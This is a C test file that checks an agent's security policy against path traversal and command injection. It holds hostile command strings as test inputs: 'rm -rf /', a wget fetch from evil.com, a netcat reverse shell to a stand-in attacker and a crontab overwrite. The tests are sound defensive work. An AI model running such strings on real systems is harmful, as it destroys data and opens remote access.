/* Adversarial security tests - path traversal, command injection, edge cases. */
#include "human/core/allocator.h"
#include "human/core/error.h"
#include "human/security.h"
#include "test_framework.h"
#include <stdlib.h>
#include <string.h>

static const char *allowed[] = {"cat", "ls", "echo"};
static const size_t allowed_len = 3;

static void test_path_traversal_unix(void) {
    hu_security_policy_t policy = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .workspace_dir = "/tmp/workspace",
        .allowed_paths = (const char *[]){"/tmp/workspace"},
        .allowed_paths_count = 1,
    };
    HU_ASSERT_FALSE(hu_security_path_allowed(&policy, "../../etc/passwd", 16));
    HU_ASSERT_FALSE(hu_security_path_allowed(&policy, "/etc/passwd", 11));
}

static void test_path_traversal_windows(void) {
    hu_security_policy_t policy = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_paths = (const char *[]){"C:\\workspace"},
        .allowed_paths_count = 1,
    };
    HU_ASSERT_FALSE(hu_security_path_allowed(&policy, "..\\..\\windows\\system32", 22));
}

static void test_command_injection_semicolon(void) {
    hu_security_policy_t p = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, "ls; rm -rf /"));
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, "cat x; wget http://evil.com"));
}

static void test_command_injection_pipe(void) {
    hu_security_policy_t p = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, "cat file | nc -e /bin/sh attacker 4444"));
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, "ls | tee /etc/crontab"));
}

static void test_command_injection_backticks(void) {
    hu_security_policy_t p = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, "echo `whoami`"));
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, "ls $(rm -rf /)"));
}

static void test_command_injection_subshell(void) {
    hu_security_policy_t p = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, "echo $(id)"));
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, "cat ${PATH}"));
}

static void test_command_very_long(void) {
    char buf[5000];
    memset(buf, 'a', 4095);
    buf[4095] = '\0';
    memcpy(buf + 4095, " ls", 4);
    hu_security_policy_t p = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, buf));
}

static void test_command_unicode(void) {
    hu_security_policy_t p = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    HU_ASSERT_TRUE(hu_policy_is_command_allowed(&p, "cat file.txt"));
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, "cat file | wget http://evil.com"));
}

static void test_command_null_byte(void) {
    char buf[] = "ls\x00; rm -rf /";
    hu_security_policy_t p = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    HU_ASSERT_TRUE(hu_policy_is_command_allowed(&p, buf));
}

static void test_rate_limit_exhaustion(void) {
    hu_allocator_t alloc = hu_system_allocator();
    hu_rate_tracker_t *t = hu_rate_tracker_create(&alloc, 3);
    HU_ASSERT_NOT_NULL(t);
    HU_ASSERT_TRUE(hu_rate_tracker_record_action(t));
    HU_ASSERT_TRUE(hu_rate_tracker_record_action(t));
    HU_ASSERT_TRUE(hu_rate_tracker_record_action(t));
    HU_ASSERT_FALSE(hu_rate_tracker_record_action(t));
    HU_ASSERT_TRUE(hu_rate_tracker_is_limited(t));
    hu_rate_tracker_destroy(t);
}

static void test_policy_null_inputs(void) {
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(NULL, "ls"));
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(NULL, NULL));
}

static void test_policy_empty_command(void) {
    hu_security_policy_t p = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, ""));
}

static void test_policy_validate_null_command(void) {
    hu_security_policy_t p = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    hu_command_risk_level_t risk;
    hu_error_t err = hu_policy_validate_command(&p, NULL, false, &risk);
    HU_ASSERT_EQ(err, HU_ERR_INVALID_ARGUMENT);
}

static void test_path_allowed_null_policy(void) {
    HU_ASSERT_FALSE(hu_security_path_allowed(NULL, "/tmp/file", 9));
}

static void test_path_allowed_no_allowlist(void) {
    hu_security_policy_t policy = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_paths = NULL,
        .allowed_paths_count = 0,
    };
    /* Default-deny: empty allowlist means no path is allowed */
    HU_ASSERT_FALSE(hu_security_path_allowed(&policy, "/any/path", 9));
}

void run_adversarial_tests(void) {
    HU_TEST_SUITE("Adversarial - Path traversal");
    HU_RUN_TEST(test_path_traversal_unix);
    HU_RUN_TEST(test_path_traversal_windows);
    HU_RUN_TEST(test_path_allowed_null_policy);
    HU_RUN_TEST(test_path_allowed_no_allowlist);

    HU_TEST_SUITE("Adversarial - Command injection");
    HU_RUN_TEST(test_command_injection_semicolon);
    HU_RUN_TEST(test_command_injection_pipe);
    HU_RUN_TEST(test_command_injection_backticks);
    HU_RUN_TEST(test_command_injection_subshell);

    HU_TEST_SUITE("Adversarial - Edge cases");
    HU_RUN_TEST(test_command_very_long);
    HU_RUN_TEST(test_command_unicode);
    HU_RUN_TEST(test_command_null_byte);
    HU_RUN_TEST(test_rate_limit_exhaustion);
    HU_RUN_TEST(test_policy_null_inputs);
    HU_RUN_TEST(test_policy_empty_command);
    HU_RUN_TEST(test_policy_validate_null_command);
}
